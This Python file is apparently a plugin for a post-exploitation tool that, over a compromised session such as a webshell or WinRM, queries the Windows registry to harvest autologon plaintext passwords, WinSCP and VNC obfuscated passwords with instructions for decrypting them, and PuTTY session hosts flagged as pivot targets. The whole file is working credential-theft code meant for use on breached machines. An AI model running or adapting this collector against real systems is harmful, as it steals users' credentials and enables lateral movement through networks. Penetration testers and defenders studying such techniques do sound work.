"""Windows registry credential collector: the registry is a dense credential
store reap otherwise ignores. Read-only `reg query` via session.exec (works over
winrm/webshell/pwncat). Reversibly-obfuscated stores (WinSCP/VNC) are emitted as
capabilities with the decrypt action; plaintext autologon becomes a credential.
"""
from __future__ import annotations

import re

from ...models import Credential, Finding
from ..base import Module, register

# reg query output line:  <name>    <TYPE>    <value>
_REG_VAL = re.compile(r"^\s*(?P<name>\S.*?)\s+REG_\w+\s+(?P<val>.*)$")


def _values(out: str) -> dict:
    vals = {}
    for line in out.splitlines():
        m = _REG_VAL.match(line)
        if m:
            vals[m.group("name").strip().lower()] = m.group("val").strip()
    return vals


@register
class WindowsRegistry(Module):
    name = "windows_registry"

    def triggers(self, ctx) -> bool:
        return ctx.os == "windows"

    def collect(self, session):
        findings = []
        findings += self._autologon(session)
        findings += self._winscp(session)
        findings += self._vnc(session)
        findings += self._putty(session)
        return findings

    def _q(self, session, cmd):
        return session.exec(cmd + " 2>nul", timeout=20).stdout

    def _autologon(self, session):
        out = self._q(session, 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT'
                               '\\CurrentVersion\\Winlogon"')
        v = _values(out)
        pw = v.get("defaultpassword")
        user = v.get("defaultusername")
        dom = v.get("defaultdomainname")
        findings = []
        if user:
            findings.append(Finding(type="info", severity="low",
                                    title=f"System user: {user}",
                                    detail="Winlogon DefaultUserName",
                                    source_module=self.name))
        if pw:
            findings.append(Finding(
                type="credential", severity="high", title="Winlogon autologon password",
                detail=f"DefaultUserName={user} DefaultDomainName={dom}",
                source_module=self.name,
                credential=Credential(kind="password", secret=pw, username=user,
                                      source="HKLM\\...\\Winlogon",
                                      metadata={"domain": dom})))
        return findings

    def _winscp(self, session):
        out = self._q(session, 'reg query "HKCU\\Software\\Martin Prikryl'
                               '\\WinSCP 2\\Sessions" /s')
        findings = []
        for m in re.finditer(r'(?im)^\s*Password\s+REG_SZ\s+(?P<pw>\S+)', out):
            findings.append(Finding(
                type="capability", severity="high", title="WinSCP saved password",
                detail="stored obfuscated (reversible)", source_module=self.name,
                credential=Credential(
                    kind="capability", secret=m.group("pw"), source="HKCU\\...\\WinSCP 2",
                    metadata={"capability": "winscp_password",
                              "action": "decrypt with winscppasswd (fixed reversible "
                                        "algorithm)"})))
        return findings

    def _vnc(self, session):
        findings = []
        for hive in (r"HKCU\Software\TightVNC\Server",
                     r"HKLM\SOFTWARE\RealVNC\vncserver",
                     r"HKCU\Software\ORL\WinVNC3\Password"):
            out = self._q(session, f'reg query "{hive}"')
            for m in re.finditer(r'(?im)^\s*Password\S*\s+REG_\w+\s+(?P<pw>\S+)', out):
                findings.append(Finding(
                    type="capability", severity="high", title=f"VNC password ({hive})",
                    detail="fixed-key obfuscation", source_module=self.name,
                    credential=Credential(
                        kind="capability", secret=m.group("pw"), source=hive,
                        metadata={"capability": "vnc_password",
                                  "action": "decrypt with vncpwd (fixed DES key)"})))
        return findings

    def _putty(self, session):
        out = self._q(session, r'reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s')
        findings = []
        host = user = None
        for line in out.splitlines():
            m = _REG_VAL.match(line)
            if not m:
                continue
            name, val = m.group("name").strip().lower(), m.group("val").strip()
            if name == "hostname":
                host = val
            elif name == "username" and val:
                user = val
        if host:
            findings.append(Finding(
                type="info", severity="low", title=f"PuTTY saved session: {host}",
                detail=f"user={user or '?'} (pivot target / key hint)",
                source_module=self.name))
        return findings
